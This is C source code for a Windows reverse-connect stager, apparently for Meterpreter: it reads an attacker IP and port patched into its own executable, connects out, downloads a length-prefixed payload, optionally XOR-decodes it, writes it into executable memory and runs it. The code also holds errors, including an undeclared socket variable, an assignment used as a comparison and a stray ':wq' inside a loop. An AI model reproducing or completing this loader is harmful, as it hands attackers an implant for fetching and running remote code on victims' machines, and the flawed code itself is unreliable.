#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define USEXOR 0

int initwsa();
short getcinfo(char *, char *, int);
void xor(char *, int);
SOCKET getsocket(char *);
DWORD WINAPI threadexec(LPVOID);

WSADATA wsa;

int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow){
    HANDLE threadhandle;
    DWORD threadid;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char szPath[MAX_PATH];

    GetModuleFileName(NULL, szPath, MAX_PATH);
    ZeroMemory(&si, sizeof si);
    si.cb = sizeof si;
    ZeroMemory(&pi, sizeof(pi));

    if(strlen(lpCmdLine) == 0){
        strcat_s(szPath, MAX_PATH, " 1");
        CreateProcess(NULL, szPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    }

    if(strlen(lpCmdLine) > 0){
        threadhandle = CreateThread(NULL, 0, threadexec, szPath, 0, &threadid);
        WaitForSingleObject(threadhandle, INFINITE);
    }
}

DWORD WINAPI threadexec(LPVOID exename){
    SOCKET sockfd;
    int numbytes = 0;
    int total = 0;
    unsigned char *payload;
    char recvbuf[1024];
    DWORD payloadlength = 0;
    HMODULE loadedfile = NULL;

    if(initwsa() != 0){
        exit(0);
    }

    sockfd = getsocket((char *)exename);
    numbytes = recv(meterpretersock, (char *)&payloadlength, sizeof DWORD, 0);
    payload = (unsigned char *)VirtualAlloc(NULL, payloadlength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memset(payload, 0, payloadlength);
    memset(recvbuf, 0, 1024);

    do{
        numbytes = recv(sockfd, recvbuf, 1024, 0);
        if(USEXOR){
            xor(&recvbuf[0], numbytes);
        }
        memcpy(payload, recvbuf, numbytes);
        payload += numbytes;
        total += numbytes;
        payloadlength -= numbytes;
    } while (payloadlength > 0);
    
    payload -= total;

    __asm{
        mov edi, sockfd
    }
    int(*ret)() = (int(*)())payload;
    ret();
}

SOCKET getsocket(char *self){
    SOCKADDR_IN sa;
    SOCKET sockfd;
    int rv = 0;
    short port = 0;
    char *ipaddr = (char *)malloc(sizeof char * 25);
    
    memset(ipaddr, 0, sizeof char * 16);
    port = getcinfo(self, ipaddr, 16);

    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sockfd = INVALID_SOCKET){
        exit(0);
    }
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(ipaddr);
    sa.sin_port = htons(port);

    rv = connect(sockfd, (SOCKADDR *)&sa, sizeof sa);
    if(rv == SOCKET_ERROR){
        exit(0);
    }
    free(ipaddr);
    return sockfd;
}

int initwsa(){
    if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0){
        return -1;
    }
    return 0;
}

short getcinfo(char *self, char *ipaddr, int len){
    int i = 0;
    int offset = 0x4e;
    errno_t ferr;
    short port = 0;
    FILE * file = NULL;
    ferr = fopen_s(&file, self, "r");
    fseek(file, offset, SEEK_SET);
    fread((void *)&port, (size_t) sizeof short, 1, file);
    fread(ipaddr, (size_t)len, 1, file);
    fclose(file);
    return port;
}

void xor(char *data, int len){
    int i;
    for(i=0;i<len;++i){
        data[i] = data[i] ^ 0x50;:wq
    }
}